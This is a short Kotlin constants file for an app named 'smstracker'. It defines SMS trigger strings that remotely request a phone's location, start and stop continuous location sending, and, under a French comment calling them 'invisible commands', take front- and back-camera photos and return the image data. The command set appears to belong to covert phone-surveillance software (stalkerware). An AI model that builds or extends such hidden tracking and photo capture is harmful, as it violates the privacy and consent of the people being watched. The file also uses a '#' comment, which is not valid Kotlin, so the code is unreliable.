package com.safi.smstracker

object Commands {
    const val PORT = 7777
    const val REQUEST_POS_ONCE = "!!GET_POS"
    const val REQUEST_POS_START = "!!START_SEND"
    const val REQUEST_POS_STOP = "!!STOP_SEND"
    const val RESPONSE_POS = "!!POS:"
    
    # 📸 NOUVELLES COMMANDES INVISIBLES
    const val REQUEST_PHOTO_FRONT = "!!PHOTO_FRONT"
    const val REQUEST_PHOTO_BACK = "!!PHOTO_BACK"
    const val RESPONSE_PHOTO = "!!PHOTO_DATA:"
}
